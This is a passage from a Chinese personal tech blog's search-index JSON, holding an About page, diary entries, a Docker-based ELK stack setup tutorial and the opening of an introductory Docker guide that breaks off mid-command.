{"pages":[{"title":"About","text":"欲何求生于千禧一代间，年少轻狂不知高。 寒窗苦读十多载，无奈吾未有所为。 而今已过弱冠时，此时立沪两茫茫。 问己能有几多愁，木子不知欲何求。 关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 可以说博主的语文那是相当差劲了，高考六七十分的选手（我也不知道为什么，考完之后明明感觉还行的），说多了都是泪啊 (ノへ￣、)。所以想在这个博客里锻炼一下自己的语言组织能力。 基于以上几点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能 ╰(°▽°)╯ 2018-10-10 在本站右下角添加Aplayer音乐系统 (ˉ▽￣～) 切~~ 2018-12-10 为了进一步美化以及提高阅读体验，在本站添加了random动漫背景。 2019-03-01 换上了自己独立的域名https://muzimz.cn，欢迎每一位到来的朋友QAQ 关于我木子是江西上饶的一位小伙子，现于上海就读，现实生活中比较内向、形单影只，但热衷于各种技术，学的东西也比较杂，目前正朝着极客的方向努力。至于未来发展的如何，一切都只是未知数，总而言之，言而总之，希望自己能够在这条道路上坚持下去。个人爱好： 动漫、code、音乐、乒乓球、棋牌本站会尽量维护并且不定期的更新一些自己在学习过程中所积累的知识，欢迎每一位志同道合朋友的到来，同时也希望有问题及时联系博主。 本人擅长Ai、Fw、Fl、Br、 Ae、Pr、Id、Ps等软件的安装与卸载，精通 CSS、JavaScript、PHP、ASP、C、C＋＋、 C#、Java、Ruby、Perl、Lisp、python、 Objective-C、ActionScript、Pascal等单词拼 写，熟悉Windows、Linux、Mac、 Android、IOS、WP8等系统的开关机……求一份设计相关的工作本人擅长Ai、Fw、Ps等软件的安装与卸载的工作 Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153 右方的DaoVoice在线联系 文末的Gitalk留言 友链添加最后，欢迎各位大佬互加友链，可在下方留言，友链互加事项及方式如下： 事项： 贵站需要保持一定的活跃度 贵站必须有10篇以上原创文章 贵站不在更新请及时联系本站 方式： 贵站将本站添加至友链后，可在下方Gitalk留言，附上贵站的链接及贵站主要分享类别即可。 本站须知 本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。 本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。 本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。 本站转载文章会在醒目处留有说明，如有侵权还请联系。 如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话也不要扔鸡蛋QAQ，谢谢。","path":"about/index.html"},{"title":"tags","text":"","path":"tags/index.html"},{"title":"简简单单","text":"2019-04-05今天看了看关于英语阅读理解的方法视频，感觉相当的受益。以前的自己只是想当然的以为英语只有多做题，只有在题海中总结自己的经验才能有所提高，但现在才发现这个想法是多么的错误。我们不是圣人，也没有太多的时间和能力去研究其中的奥秘，现在的我们应该要站在巨人的肩膀上来取得进步，刷题是没错，但刷题的前提是要先掌握好解题的方法，否则只会浪费自己太多宝贵的时间。所以说今后需要抽点时间适当的看看视频，获取一下前辈们总结的经验。 2019-03-29忙了10天的微信小程序（Detective | 案发现场）已经上线了，功能不算强大且界面还有点丑。数据主要来源于网络，大多由爬虫所得，所有的数据只供分享不作商用，侵权联系。除了敏感信息之外，源码已经开源在Github。由于个人时间、精力、能力的有限，所以暂时不对其进行扩展，如果发现Bug或者有什么好的建议，可在小程序的留言板板块进行留言。(๑•̀ㅂ•́)و✧ 2019-03-06今天悲催了，开学10天，用了近二十天的26号位置到最后却是属于一个女生的。这个女生也是有点小可恶，直接把我书拿了下来，用了大半年很喜欢的一支笔也不知所踪。不想和她争什么，先回来这个星期再想想办法吧！！！ 2019-03-01本站已经换上了自己独立的域名https://muzimz.cn，由于暂时没有资金支持，也没有闲暇的时间去备案，所以没有去买服务器，现在暂时使用的是依然github服务器。访问的速度也许不是很快，以后有精力再来进一步优化吧。欢迎每一位访客的到来！！！QAQ 2019-02-251200RMB的原产MSI键盘买不起，不到400的ikbc键盘还是可以考虑下的，这款型号为c87 cherry茶轴黑色 PBT键帽，原本打算想买poker的，但是生怕自己61键用的不习惯，最终还是选择了这款ikbc。用了一段时间感觉还行，最近有想入手机械键盘的可以考虑下。 2019-02-18今雨，收拾收拾准备返校迎接新的学期，必须加油啊！！！ 2019-02-14什么节奏，这段时间太冷了吧。w(ﾟДﾟ)w 2019-01-13没了味，这杯水有点调皮了。 2018-11-12这个零六年的动漫太好看了吧，这么多年居然把这个给忘了。","path":"schedule/index.html"},{"title":"categories","text":"","path":"categories/index.html"}],"posts":[{"title":"ElasticSearch、kibana、logstash","text":"前言Elasticsearch是什么？既然它是英文的，我们不妨借助有道从Elasticsearch这几个字母出发来看看其字面上所表达的意思吧。其分为elastic和search两个独立的单词，既然如此，我们无脑有道一波，得到的解释如下：从有道的解释来看，我们可以简单的对其理解为：Elasticsearch是及其具有弹性的、灵活的、像松紧带一样的且可供搜寻检索的一款工具。o(*≧▽≦)ツ┏━┓ 百度百科对其解释如下： ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。ElasticSearch用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在Java、.NET（C#）、PHP、Python、Apache、Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜索引擎，其次是Apache Solr，也是基于Lucene。 从如上信息我们可以得知，Elasticsearch是一款实时、分布式存储的搜索引擎，在实际开发过程中，我们常常会把数据放在Elasticsearch搜索引擎中，然后从引擎中去实际需要的数据。而且在实际搜索过程中，我们也会有许多的Api支持来对数据进行检索，比如排序、条件查询等，其中在Elasticsearch中最为强大之处就是他的模糊检索功能。讲到这，可能有些Mysql经验但没接触过Elasticsearch的朋友可能会有个疑问，Mysql大法不是无敌么，其中的like语句不能模糊查询么？where and不能条件检索么？orderby不能对数据进行排序么？我随随便便就信手拈来一个Sql语句不就能实现业务的需求么： 123456select department_name, count(*) 员工个数from departments d, employees ewhere d.department_id = e.department_idgroup by d.department_idhaving count(*)&gt;5order by count(*) desc; 是这样没错，以上SQL代码的确能够实现实际需求，但是当我们的业务逐渐变得复杂、庞大，我们的用户量越来越多，我们就不得不站在用户的角度来想想了。试想一下，假设哪些淘宝er每天打开淘宝搜索自己想要的数据时都要等个几十秒，那会是怎样的一种画面。又比如，在打开我们常见文件来检索我们需要数据的时候，比如txt、word、excel，我们一般都能迅速打开，那是因为这些文件占用实际空间都太小，这些文件大多就几kb，假设我们打开一个以G为单位的日志文件，此时的系统还能像以往那样正常么？换言之，Elasticsearch采用的是索引搜索，能够具有强大的搜索能力，能够达到实时搜索，稳定，可靠，快速，安装的效用。 另外，Elasticsearch在处理日志的过程中，其常常与数据收集和日志解析引擎Logstash以及名为Kibana的分析和可视化平台配合使用，也就是常说的ELK系统。文本将主要介绍以下几个方面的内容 基于Docker容器来搭建ELK系统 Elasticsearch集群的搭建 在Elasticsearch中引入IK分词器插件 重点讲解基于SpringData Es来对Elasticsearch进行操作 最后基于本小程序中数据库中的数据来熟练操作Elasticsearch ELK系统的搭建 Elasticsearch是实时全文搜索和分析引擎，提供搜集、分析、存储数据三大功能；是一套开放REST和JAVA API等结构提供高效搜索功能，可扩展的分布式系统。它构建于Apache Lucene搜索引擎库之上。 Logstash是一个用来搜集、分析、过滤日志的工具。它支持几乎任何类型的日志，包括系统日志、错误日志和自定义应用程序日志。它可以从许多来源接收日志，这些来源包括 syslog、消息传递（例如 RabbitMQ）和JMX，它能够以多种方式输出数据，包括电子邮件、websockets和Elasticsearch。1Kibana是一个基于Web的图形界面，用于搜索、分析和可视化存储在 Elasticsearch指标中的日志数据。它利用Elasticsearch的REST接口来检索数据，不仅允许用户创建他们自己的数据的定制仪表板视图，还允许他们以特殊的方式查询和过滤数据 注：图片来源网络 总结就是Elasticsearch用于搜索，Kibana用于可视化，Logstash用于搜集。下面我们来基于Docker来搭建一下ELK系统，关于Docker的安装及基本使用，前面的文章已经有过记录了，此处不再过多的介绍。另外，值得注意的是这三者之间的版本关系，（如果使用其他版本的工具，则按照如下方式搭建可能会产生其他问题）： Elasticsearch:5.6.8 Kibana:5.6.8 Logstash:lastest Elasticsearch的安装 Docker拉取Elasticsearch镜像 1docker pull elasticsearch:5.6.8 在本地创建elasticsearch容器所映射的配置文件以及data目录 12345# 在centos本地创建配置文件，并配置mkdir -p /resources/elasticsearch/config # 创建config目录mkdir -p /resources/elasticsearch/data # 创建data目录# 将http.host配置为0.0.0.0的授权对象，将配置写入config目录下的elasticsearch.yml配置文件中echo \"http.host: 0.0.0.0\" &gt;&gt; /resources/elasticsearch/config/elasticsearch.yml 创建一个elasticsearch容器，并开机自运行 123456789101112131415# 创建容器并开机运行（single-node表示单节点模式，后面会介绍集群方式下elasticsearch的搭建）# 注意：在docker中\\表示换行docker run --name elasticsearch -p 9200:9200 \\-e \"discovery.type=single-node\" \\-e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" \\-v /resources/elasticsearch/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml \\-v /resources/elasticsearch/data:/usr/share/elasticsearch/data -d elasticsearch:5.6.8# 参数介绍：# --name：为容器起一个别名# -p：将容器的运行端口映射到本地端口# -e \"discovery.type=single-node\"：表示单节点模式下创建，后文将介绍集群模式的搭建# -v：表示将容器中的配置文件和data文件映射到上文本地所创建的文件，方便后面的配置# 将elasticsearch容器设置为开机自启动docker update new-elasticsearch --restart=always 这样一来，我们便安装好elasticsearch了，我们可以使用curl命令来测试一下：12345678910111213141516# 使用curl来访问elasticsearch的运行端口curl localhost:9200# 运行输出结果如下则成功安装&#123; \"name\" : \"XwmNOpR\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"yB3VNHxmQzevk1vXUQTkcg\", \"version\" : &#123; \"number\" : \"5.6.8\", \"build_hash\" : \"688ecce\", \"build_date\" : \"2018-02-16T16:46:30.010Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.6.1\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 当然了，我们也可以使用浏览器来对其进行访问，访问方式为http://[ip]:9200，端口为虚拟机ip，同样可以得到对应的结果，另外如果使用的是阿里云或腾讯云服务器，则需要在控制台中配置相应的安全组，否则无法访问 安装kibana Docker拉取Kibana镜像 12# Docker拉取Kibana镜像docker pull kibana:5.6.8 创建容器并设置开机自启动 12345# 创建容器kibana容器，对应的参数如上，另外需要指定elasticsearch的地址docker run --name kibana -e ELASTICSEARCH_URL=http://[ip]:9200 -p 5601:5601 \\-d kibana:5.6.8# 配置开机自启动docker update new-kibana --restart=always 安装完成之后，我们便可curl一下kibana的地址，或在浏览器访问http://[ip]:5601即可：12345678910[root@iZm5eei156c9h3hrdjpe77Z ~]# curl localhost:5601&lt;script&gt;var hashRoute = '/app/kibana';var defaultRoute = '/app/kibana';var hash = window.location.hash;if (hash.length) &#123; window.location = hashRoute + hash;&#125; else &#123; window.location = defaultRoute;&#125;&lt;/script&gt;[root@iZm5eei156c9h3hrdjpe77Z ~]# 安装logstash 拉取Logstash镜像 12# 拉取镜像docker pull logstash 创建一个配置文件，并进行input和output的配置 123456789101112131415161718# 在/resources/logstash中创建logstash.conf文件，并使用vim来对其进行编辑mkdir /resources/logstash# 使用vim编辑vim logstash.conf# 配置文件内容如下，更换为自己Elasticsearch的ip即可input &#123; tcp &#123; port =&gt; 4560 codec =&gt; json_lines &#125;&#125;output&#123; elasticsearch &#123; hosts =&gt; [\"[ip]:9200\"] index =&gt; \"applog\" &#125; stdout &#123; codec =&gt; rubydebug &#125;&#125; 创建容器并开机自启动 123456789# 创建容器，这里需要指明Elasticsearch来进行链接docker run -d -p 4560:4560 \\-v /resources/logstash/logstash.conf:/etc/logstash.conf \\--link elasticsearch:elasticsearch \\--name logstash logstash \\logstash -f /etc/logstash.conf# 开机自启动docker update new-logstash --restart=always 以上便是Logstash的安装过程，我们可以进入Logstash容器内来简单的使用以下 进入Logstash容器，并cd到bin目录12docker exec -it logstash /bin/bashcd /usr/share/logstash/bin 执行logstash命令12# 注意：需要这里需要指定--path.data参数，否则在运行的过程会出错logstash -e 'input &#123; stdin &#123; &#125; &#125; output &#123; stdout &#123;&#125; &#125;' --path.data=/root/ 运行之后，我们在控制台输入hello world，即会出现以下结果 基于Logstash对Elasticsearch索引库中数据的导入和导出应用需求：在192.168.220.201主机中的es中并没有info索引库，而192.168.220.202中的es有info索引库，此时我们可以尝试借助logstash来先将skuinfo索引库从192.168.220.202导出成一个json文件，然后将该文件借助logstash导入到192.168.220.201的es索引库中。 使用logstash将es数据从索引库中导出创建一个临时的文件夹，用于保存导出的数据以及配置文件1mkdir /resources/mydata/logstash_temp 使用vim来创建一个export.conf配置文件，并对其进行配置1vim export.conf export.conf文件内容如下123456789101112131415# 将192.168.220.202 Elasticsearch中info索引库导出为一个info.json文件input&#123; elasticsearch &#123; hosts =&gt; [\"192.168.220.202:9200\"] # 指定Elasticsearch的地址，该地址中含有目标数据 index =&gt; \"info\" # 指定需要导出的索引库 size =&gt; 200 # 指定每次导出数据每批次的大小，注意不能设置太大，否则会出错 scroll =&gt; \"5m\" docinfo =&gt; false &#125;&#125;output&#123; file &#123; path =&gt; \"skuinfo.json\" # 指定保存的数据路径和json文件的名称 &#125; &#125; 使用docker cp命令将该导出的配置文件复制的logstash容器的bin目录中12# 将export.conf文件cp到logstash容器中docker cp ./export.conf logstash:/usr/share/logstash/bin 进入logstash容器，并执行配置文件1234# 进入logstash，然后执行配置文件docker exec -it logstash /bin/bashcd /usr/share/logstash/bin./logstash -f ./export.conf --path.data=/root/ # 务必要指定path.data属性，不然会报错 执行完成之后便会在当前目录下产生一个info.json文件，将该数据文件导出到centos中12# 执行完成之后就会在当前目录下产生一个info.json文件，将该文件导出到centos中docker cp logstash:/usr/share/logstash/bin/info.json /resources/mydata/ 即可完成将索引库中的数据导出成一个json文件，该文件存在于/resources/mydata/info.json logstash对Elasticsearch索引库中数据的导入 完成json数据的导入及conf文件的配置 12345# 1. 将192.168.220.202中的info.json文件使用xftp工具导入到windows本地# 2. 将该文件通过xftp工具导入到192.168.220.201 /resources/mydata/logstash_temp中cd /mydata/mysources/logstash_temp# 使用vim对import.conf进行配置vim import.conf import.conf的配置文件如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 读取json文件input &#123; file &#123; # 设置json文件路径，多个文件路径可设置成数组[]，模糊匹配用* path =&gt; \"/root/skuinfo.json\" start_position =&gt; \"beginning\" # 设置编码 codec =&gt; json &#123;charset =&gt; \"UTF-8\"&#125; # 当存在多个文件的时候可使用type指定输入输出路径 type =&gt; \"json_index\" &#125;&#125;# 过滤格式化数据filter &#123; mutate&#123; #删除无效的字段 remove_field =&gt; [\"@version\",\"message\",\"host\",\"path\"] &#125; # 新增timestamp字段，将@timestamp时间增加8小时 ruby &#123; code =&gt; \"event.set('timestamp', event.get('@timestamp').time.localtime + 8*60*60)\" &#125;&#125;# 数据输出到ESoutput &#123; #日志输出格式，json_lines;rubydebug等 stdout &#123; codec =&gt; rubydebug &#125; #输出到es if[type] == \"json_index\"&#123; #无法解析的json不记录到elasticsearch中 if \"_jsonparsefailure\" not in [tags] &#123; elasticsearch &#123; #es地址ip端口 hosts =&gt; \"192.168.220.201:9200\" # 配置数据转入到es中的 index =&gt; \"info\" #类型 document_type =&gt; \"skuinfo\" &#125; &#125; &#125;&#125; 完成import.conf文件的配置之后，我们即可来真正实现数据导入 1234567# 将import.conf文件和info.json文件导入到logstash容器中docker cp ./import.conf logstash:/usr/share/logstash/bin # 导入conf配置文件docker cp ./skuinfo.json logstash:/root/ # 导入json数据文件，导入的路径注意与conf配置文件中的配置路径保持一致# 进入到logstash容器中，并执行logstash命令完成数据的导入docker exec -it logstash /bin/bashcd /usr/share/logstash/bin./logstash -f ./import.conf --path.data=/root/ 等待执行完成之后访问192.168.220.201:5601即可访问到info索引库中的数据 安装ik中文分词器ik中文分词器插件的安装坑一：我们安装ik分词器的时候，一般是在github中来下载zip文件，然后传送到centos中，最后再上传到elasticserch容器中，但是github中标明的版本与实际版本根本不相同。另一方面，在我们下载不同版本的elasticsearch时，有的版本容器运行会出错，有些正常。所以我们以后我们搭建elk的时候就同一安装5.6.8版本（一定要注意） 坑二：我们一般在github上下载zip文件（无论什么文件）的时候会非常非常的慢（不是一般的慢），所以我们以后在使用github来下载的时候可以借助gitee（码云）来下载，在码云中创建一个仓库的时候，选择导入已有的仓库，然后将原github的git连接复制粘贴上去，最后create。一旦创建，我们就可以借助码云中来间接下载github仓库的任何文件，且下载的速度会大大加快 ik分词器链接：https://gitee.com/tianxingjian123/elasticsearch-analysis-ik 1234567891011121314151617181920212223242526272829# ik分词器链接：https://gitee.com/tianxingjian123/elasticsearch-analysis-ik# 下载5.6.8的ik分词器之后，我们需要使用maven将其打包cd C:\\Users\\M\\Desktop\\code-demo\\elasticsearch-analysis-ikmvn package -Pdist,native -DskipTests -Dtar# 使用maven打包完成之后，即可生成一个target文件夹，里面有./releases/elasticsearch-analysis-ik-5.6.8.zip# 在虚拟机中创建一个ik文件夹mkdir ik# 之后使用xftp将该zip文件上传到ik文件夹中，然后使用unzip命令解压该zip文件，解压之后删除zip文件unzip elasticsearch-analysis-ik-5.6.8.ziprm -rf elasticsearch-analysis-ik-5.6.8.zip# 之后使用docker将该ik文件夹传到elasticsearch容器的plugins中docker cp ./ik elasticsearch:/usr/share/elasticsearch/plugins# 进入elasticsearch容器docker exec -it new-elasticsearch /bin/bash# 之后如下命令可查看是否成功上传ik文件夹root@78f36ce60b3f:/usr/share/elasticsearch# cd plugins/root@78f36ce60b3f:/usr/share/elasticsearch/plugins# lsikroot@78f36ce60b3f:/usr/share/elasticsearch/plugins# cd ikroot@78f36ce60b3f:/usr/share/elasticsearch/plugins/ik# lscommons-codec-1.9.jar httpclient-4.5.2.jarcommons-logging-1.2.jar httpcore-4.4.4.jarconfig plugin-descriptor.propertieselasticsearch-analysis-ik-5.6.8.jarroot@78f36ce60b3f:/usr/share/elasticsearch/plugins/ik# # 之后进入到bin目录下，并查看已经安装的ik分词器插件root@78f36ce60b3f:cd /usr/share/elasticsearch/binroot@78f36ce60b3f:/usr/share/elasticsearch/bin# elasticsearch-plugin listik 以上操作完成之后，就算是完成了在Elasticsearch中引入ik中文分词器插件了，注意：以上步骤务必需要完全一致，否则会造成各种问题。 分词结果测试1234567# 打开chrom浏览器，访问：http://192.168.220.201:5601/，若出现kibana界面，说明kibana安装正常# 进入kibana的Dev Tools界面，然后使用如下测试ik中文分词器插件是否正常安装GET bank/_analyze&#123; \"text\": \"现在是大年三十凌晨一点三十分，有点冷，我写完这篇文章就睡觉！\", \"analyzer\": \"ik_smart\"&#125; 运行之后，测试ik中文分词结果如下，可见已经完成了对中文句子的分词 Elasticsearch集群的搭建创建集群所需要的配置文件及数据文件，以便容器的映射123456789mkdir /mydatacd /mydatamkdir elasticsearch1cd elasticsearch1mkdir data # 注意要确保data目录下为空，否则在实际运行过程中会出错mkdir configcd confvim elasticsearch.yml# elasticsearch.yml文件配置信息如下 elasticsearch.yml文件的配置信息：123456789101112131415161718# 开启跨域，为了让es-head可以访问，此处需要额外安装header插件http.cors.enabled: truehttp.cors.allow-origin: \"*\"# 集群的名称（一样）cluster.name: elasticsearch# 节点的名称（不一样，根据别名来配置）node.name: es1# 指定该节点是否有资格被选举成为master节点，默认是true，es是默认集群中的第一台机器为master，如果这台机挂了就会重新选举masternode.master: true# 允许该节点存储数据(默认开启)node.data: true# 允许任何ip访问network.host: 0.0.0.0# 通过这个ip列表进行节点发现，我这里配置的是各个容器的ipdiscovery.zen.ping.unicast.hosts: [\"192.168.220.200:9300\",\"192.168.220.200:9301\",\"192.168.220.200:9302\"]#如果没有这种设置,遭受网络故障的集群就有可能将集群分成两个独立的集群 – 导致脑裂 - 这将导致数据丢失discovery.zen.minimum_master_nodes: 2 第一个elasticsearch配置文件创建好后，同理创建其他两个节点1234567891011# 配置es2cd /mydatacp -r ./elasticsearch1 ./elasticsearch2# 将其中的conf/elasticsearch.yml中配置修改一处信息node.name=es2# 配置es3cd /mydatacp -r ./elasticsearch1 ./elasticsearch3# 将其中的conf/elasticsearch.yml中配置修改一处信息node.name=es3 创建elasticsearch容器并启动1234567891011121314151617181920# 创建es1容器并启动docker run --name es1 -p 9200:9200 -p 9300:9300 \\-e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" \\-v /mydata/elasticsearch1/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml \\-v /mydata/elasticsearch1/data:/usr/share/elasticsearch/data -d elasticsearch:5.6.8# 引入ik分词器docker cp ./ik es1:/usr/share/elasticsearch/plugins# 创建es2容器并启动docker run --name es2 -p 9201:9200 -p 9301:9300 \\-e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" \\-v /mydata/elasticsearch2/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml \\-v /mydata/elasticsearch2/data:/usr/share/elasticsearch/data -d elasticsearch:5.6.8# 创建es3容器并启动docker run --name es3 -p 9202:9200 -p 9302:9300 \\-e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" \\-v /mydata/elasticsearch3/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml \\-v /mydata/elasticsearch3/data:/usr/share/elasticsearch/data -d elasticsearch:5.6.8 至此，完成以上操作即可实现了Elasticsearch集群的搭建 分别访问http://192.168.220.200:9200、http://192.168.220.200:9201、http://192.168.220.200:9202，即可发现已经搭建完成，并显示了各个es节点的对应信息。 访问http://192.168.220.200:9200/_cat/nodes可查看集群节点。 访问http://192.168.220.200:9200//_cat/health查看健康状况（green，yellow、red） 所遇问题 实例化容器之后，可能会受到进程数的限制，我们需要提高虚拟机的进程数 12345vim /etc/sysctl.conf# 添加如下一条配置vm.max_map_count=655360# 退出后重启配置sysctl -p 当实例化以上三个es容器之后，可能会存在一定的内存问题，这个时候，我们需要提高虚拟机的内存 1234567891011121314151617# 实例化以上三个es容器之后，查看当前可用内存free -m# 运行以上命令之后，可能会发现当前可用配置只有50多，而且当我们访问http://192.168.220.200:9200的时候也会发现请求失败这个时候我们打开对应虚拟机的设置，将内存设置3GB即可，不一会儿重新进入虚拟机，使用free -m命令即可发现此时内存还剩1000多可用# 完成上述配置之后，我们重启三个es容器docker restart es1 es2 es3 || docker start es1 es2 es3# 等待容器重启之后，使用chrom浏览器访问eshttp://192.168.220.200:9200http://192.168.220.200:9201http://192.168.220.200:9202# 可发现已经搭建完成，且显示了各个es节点的对应信息# 在kibana的dev tools下查看集群节点GET /_cat/nodes# 查看健康状况（green，yellow、red）GET /_cat/health","path":"2020/01/10/ElasticSearch、kibana、logstash/"},{"title":"一文入门Docker容器技术","text":"前言相信点进这篇文章的Coder，不管是在各大技术论坛上、技术交流群，亦或招聘网上，应该都有见到过Doker容器技术的面孔，随着社会节奏的加快以及迫于生活的压力，在计算机技术日新月异的今天，真正能够沉下心来学习一门技术的时间真的不多。为了不让新型冠状病毒迅速蔓延，全国人民都居家隔离，趁着这段空闲的时间，我也该是时候把过去学习时所积累的笔记沉淀一下了。本文主要是从是什么、为什么、怎么做的角度来介绍Docker容器技术得入门，能让初次接触Docker容器技术的朋友更快的使用Docker。 Docker是什么对于Docker，官方的介绍如下： Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 在实际的开发过程中，我们往往会因为环境的搭建而浪费过多的时间，而现如今有了Docker容器技术的支持，我们不再过于担心各种因为环境问题而造成的过多时间的浪费。Docker容器引擎中已经为我们提供了开发过程中所需要的各种镜像，我们需要有Resid数据库、Elasticsearch搜索技术、Mq消息队列等支持，我们都可以使用Docker中的pull命令来从中央仓库中进行拉取，而不像传统那样从各大官网亦或github中进行下载。读到这里的朋友应该会有所发现，Docker就有点类似Maven管理工具，但Docker的强大之处可并不止步于此，查阅了解后，Docker主要有以下几大特性： Automating the packaging and deployment of applications（使应用的打包与部署自动化） Creation of lightweight, private PAAS environments（创建轻量、私密的PAAS环境） Automated testing and continuous integration/deployment（实现自动化测试和持续的集成/部署） Deploying and scaling web apps, databases and backend services（部署与扩展webapp、数据库和后台服务） 总之，Docker容器是现如今相当火热的一门技术。之前读到网上有着这么一句话：电脑如果有问题，没有是重装系统解决不了的。话虽如此，但是一旦重装系统之后，我们之前系统中所有保存资源都被消除了，我们需要使用QQ增进朋友之间的感情，则要到鹅厂中去下载、安装；需要网易云音乐来放松心情，则要到官网中安装、下载，以及需要下载并安装其他各大软件才能满足自己的实际需求，一个不小心还可能会绑架其他垃圾软件。当然有的朋友会在重装系统之前自己的资源备份以下，重装系统之后再直接使用，但依然免不了N个下一步所带来的时间消耗。假如现在有这么一个容器，里面存放着我们需要的所有资源，在我们需要的时候只需要一行简单的pull命令即可迅速完成所有软件的下载安装步骤，这岂不美哉！ 没错，Docker容器就是基于这么一个思想来解决我们各大烦恼。如果对于Docker容器技术的理解还不是特别清楚，可拜读一下：漫画 | 从搬家到容器技术 Docker 应用场景解析，这篇文章使用漫画的形式来给读者介绍Docker容器的优势。 Docker的安装及测试Docker的安装我们往往是使用Linux系统来安装Docker，在之前的文章也有过Linux系统的安装，这里就不多介绍了。下面我们就在CentOS Linux release 8.0.1905 (Core)系统下来安装一下Docker吧。 查看自己的Linux版本：12[root@iZm5eei156c9h3hrdjpe77Z ~]# cat /etc/redhat-releaseCentOS Linux release 8.0.1905 (Core) 在安装Docker之前，我们先更新一下yum1update yum 安装Docker需要的软件包1yum install -y yum-utils device-mapper-persistent-data lvm2 设置一下docker的yum源1yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 查看仓库中所有的docker版本，以便安装我们需要的Docker版本1yum list docker-ce --showduplicates | sort -r 安装需要的docker版本，此处以Docker17.12.1版本1yum install docker-ce-17.12.1.ce 成功安装之后，便可使用docker version/docker -v查看docker的版本1234567891011121314151617181920212223# docker version[root@iZm5eei156c9h3hrdjpe77Z ~]# docker versionClient: Version: 17.12.1-ce API version: 1.35 Go version: go1.9.4 Git commit: 7390fc6 Built: Tue Feb 27 22:15:20 2018 OS/Arch: linux/amd64Server: Engine: Version: 17.12.1-ce API version: 1.35 (minimum version 1.12) Go version: go1.9.4 Git commit: 7390fc6 Built: Tue Feb 27 22:17:54 2018 OS/Arch: linux/amd64 Experimental: false# docker -v[root@iZm5eei156c9h3hrdjpe77Z ~]# docker -vDocker version 17.12.1-ce, build 7390fc6 之后，我们需要更换docker拉取软件的服务，这里使用的是阿里云镜像加速器，使用加速器可以提升获取Docker官方镜像的速度：12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'&#123; \"registry-mirrors\": [\"https://1ewanek5.mirror.aliyuncs.com\"]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker 这样依赖，我们便完整的安装好了Docker。（PS：由于系统环境的问题，在安装过程中可能需要到其他依赖，只需要根据提示） Docker的Hello world测试任何技术的学习，我们都离不开Hello world，Docker也不例外，下面我们来使用Docker来运行一下Hello world吧，在测试之前我们首先使用如下命令来启动Docker:123456# Docker的启动systemctl start docker# Docker的重启systemctl restart docker# Docker的开机自启动systemctl enable docker # 一般我们使用开机自启动的形式 启动好Docker之后，我们来在Docker中运行一下hello world：12# docker 运行hello worlddocker run hello-world 在我们执行docker run hello-world之后，Docker首先会根据我们的命令查看一下本地是否存在hello-world镜像，如果存在则会直接运行，如果不存在就会去中央仓库中拉取（下载）hello-world镜像（拉取过程极为迅速）之后再来运行。由于我们首次使用Docker，所以执行之后会出现以下结果：由于Docker已经帮我们拉取了hello-world镜像，所以当我们再次运行docker run hello-world之后，则会出现如下结果： 顺便一提，我们在使用Docker拉取所拉取的所有镜像都来源于Docker的中央仓库，里面存放了大量的镜像可供我们自由使用：https://hub.docker.com/ Docker的基本使用 启动docker systemctl start docker，重启systemctl restart docker，开机docker自启动systemctl enable docker 123456# Docker的启动systemctl start docker# Docker的重启systemctl restart docker# Docker的开机自启动systemctl enable docker # 一般我们使用开机自启动的形式 使用search命令来检索中央仓库中收录的镜像，以tomcat为例 12# 检索镜像：docker search [镜像名称]docker search tomcat 拉取（下载）镜像：docker pull tomcat(默认最新版本) 1234# 拉取镜像：docker pull [镜像名称]docker pull tomcat# 